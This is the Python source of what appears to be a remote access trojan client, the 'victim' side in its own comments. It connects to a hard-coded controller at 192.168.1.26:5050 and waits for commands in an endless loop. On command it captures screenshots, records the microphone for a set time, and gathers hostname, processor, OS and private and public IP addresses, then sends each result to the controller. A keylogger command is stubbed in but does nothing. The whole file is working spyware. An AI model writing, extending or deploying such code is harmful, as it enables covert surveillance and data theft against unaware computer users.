import pathlib
import smtplib

import socket
import platform

from datetime import datetime, timedelta

from pynput.keyboard import Key, Listener

import time
import os

from scipy.io.wavfile import write
import sounddevice as sd

from requests import get

from multiprocessing import Process, freeze_support
from PIL import ImageGrab

import pyaudio
import wave

import io

HEADER = 2048
PORT = 5050
FORMAT = 'utf-8'
SERVER = "192.168.1.26"
ADDR = (SERVER, PORT)

import io
import soundfile as sf
import numpy as np


class Actions:
    @staticmethod
    def screenshot():
        img = ImageGrab.grab()
        img.getdata()
        output = io.BytesIO()
        img.save(output, format='PNG')
        data = output.getvalue()
        id = "screenshot"
        return data, id

    @staticmethod
    def microphone(time=5):
        # I spend too much time on this action so decided to the the easy way...
        # to save audio file to local send it and delete
        fs = 44100
        seconds = time

        myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
        sd.wait()

        write("temp.wav", fs, myrecording)
        with open("temp.wav", 'rb') as file:
            data = file.read()
        print(data)
        os.remove("temp.wav")
        id = 'audio'
        return data, id

    @staticmethod
    def computer_information():
        content = ""
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            content += "Public IP Address: " + public_ip + '\n'

        except Exception:
            content += "Couldn't get Public IP Address (most likely max query" + '`\n`'

        content += "Processor: " + (platform.processor()) + '\n'
        content += "System: " + platform.system() + " " + platform.version() + '\n'
        content += "Machine: " + platform.machine() + "\n"
        content += "Hostname: " + hostname + "\n"
        content += "Private IP Address: " + IPAddr + "\n"
        id = 'computer_info'
        return content.encode(), id


class MySocket:
    """demonstration class only
      - coded for clarity, not efficiency
    """

    def __init__(self, sock=None):
        if sock is None:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        else:
            self.sock = sock

    def connect(self, host, port):
        self.sock.connect((host, port))

    def send(self, data, id):
        # sending the id of the file first
        send_file_name = id.encode()
        send_file_name += b' ' * (HEADER - len(send_file_name))
        self.sock.send(send_file_name)

        # sending the length of the data
        send_length = str(len(data)).encode()
        print(send_length)
        send_length += b' ' * (HEADER - len(send_length))
        self.sock.send(send_length)


        # sending the data
        self.sock.send(data)

    ''' The side of the victim only receives actions he has to do and send 
    that's why assume that we received a action
    '''

    def respond_to_commad(self):
        msg = self.sock.recv(HEADER)
        if msg == b'':
            raise RuntimeError("socket connection broken")
        action = msg.decode().replace(" ", "")
        if action == "screenshot":
            self.send(*Actions.screenshot())
        elif action == "info":
            self.send(*Actions.computer_information())
        elif "microphone" in action:
            mic_time = int(action[10:])
            self.send(*Actions.microphone(mic_time))
        elif "keylogger" in action:
            keylogger_new_time = int(action[9:])
        else:
            print("something went wrong")


conn = MySocket()
conn.connect(*ADDR)
while True:
    conn.respond_to_commad()

